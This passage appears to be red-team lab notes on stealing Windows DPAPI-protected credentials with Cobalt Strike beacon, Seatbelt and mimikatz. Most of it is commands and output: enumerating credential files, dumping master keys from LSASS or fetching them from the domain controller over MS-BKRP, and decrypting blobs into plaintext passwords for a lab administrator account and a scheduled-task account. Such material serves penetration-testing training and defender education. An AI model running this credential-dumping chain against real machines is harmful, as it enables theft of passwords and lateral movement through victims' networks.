Seatbelt can also enumerate them using the `WindowsCredentialFiles` parameter.

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

====== WindowsCredentialFiles ======

  Folder : C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\

    FileName     : 6C33AC85D0C4DCEAB186B3B2E5B1AC7C
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 9/6/2022 10:50:44 AM
    Modified     : 9/6/2022 10:50:44 AM
    Size         : 468

    FileName     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data

    MasterKey    : bfc5090d-22fe-4058-8953-47f6882f549e
    Accessed     : 9/6/2022 10:50:44 AM
    Modified     : 9/6/2022 10:50:44 AM
    Size         : 11036
```

Seatbelt also provides the GUID of the master key used to encrypt the credentials.  The master keys are stored in the users' roaming "Protect" directory.  But guess what... they're also encrypted.
```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
[*] Listing: C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     08/15/2022 17:34:31   bfc5090d-22fe-4058-8953-47f6882f549e
 928b     fil     08/15/2022 17:34:31   BK-DEV
 24b      fil     08/15/2022 17:34:31   Preferred

 ``` 

So we must decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob.  There are two ways of doing this.

The first is only possible if you have local admin access on the machine and if the key is cached in LSASS.  It will not be in the cache if the user has not recently accessed/decrypted the credential.
```
beacon> mimikatz !sekurlsa::dpapi

Authentication Id : 0 ; 1075454 (00000000:001068fe)
Session           : RemoteInteractive from 2
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 9/6/2022 9:09:54 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1104
	 [00000000]
	 * GUID      :	{bfc5090d-22fe-4058-8953-47f6882f549e}
	 * Time      :	9/6/2022 11:27:44 AM
	 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
	 * sha1(key) :	897f7bf129e6a898ff4e20e9789009d5385be1f3
```
  

We can see that the GUID matches what we are looking for, so the key `8d1539[...]19c214` is the one we need.

Another way to obtain the master key (which does not require elevation or interaction with LSASS), is to request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP).  This is designed as a failsafe in case a user changes or forgets their password, and to support various smart card functionality.
```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
  sha1: 897f7bf129e6a898ff4e20e9789009d5385be1f3
```
  This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the `@` modifier.

  

Finally, the blob can be decrypted.
```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214

  TargetName     : Domain:target=TERMSRV/sql-2.dev.cyberbotic.io
  UserName       : SQL-2\Administrator
  CredentialBlob : wIfY&cZ&d?QP9iMFEzckmj.34=@sg.*i
  ```


## With Scheduled tasks creds
Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on.  If we have local admin privileges on a machine, we can decrypt them in much the same way.  The blobs are saved under `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`.
```
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 10kb     fil     08/30/2022 12:42:24   DFBE70A7E5CC19A398EBF1B96859CE5D
 528b     fil     08/16/2022 14:55:28   F3190EBE0498B77B4A85ECBABCA19B6E

  ```

`dpapi::cred` can tell us the GUID of the master key used to encrypt each one.
```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
```
  
`sekurlsa::dpapi` to dump cached keys.
```

beacon> mimikatz !sekurlsa::dpapi

	 [00000000]
	 * GUID      :	{aaa23e6b-bba8-441d-923c-ec242d6690c3}
	 * Time      :	9/6/2022 12:14:38 PM
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
	 * sha1(key) :	cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c
```

  

And then decrypt.

```
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
  UserName       : DEV\jking
  CredentialBlob : Qwerty123
```
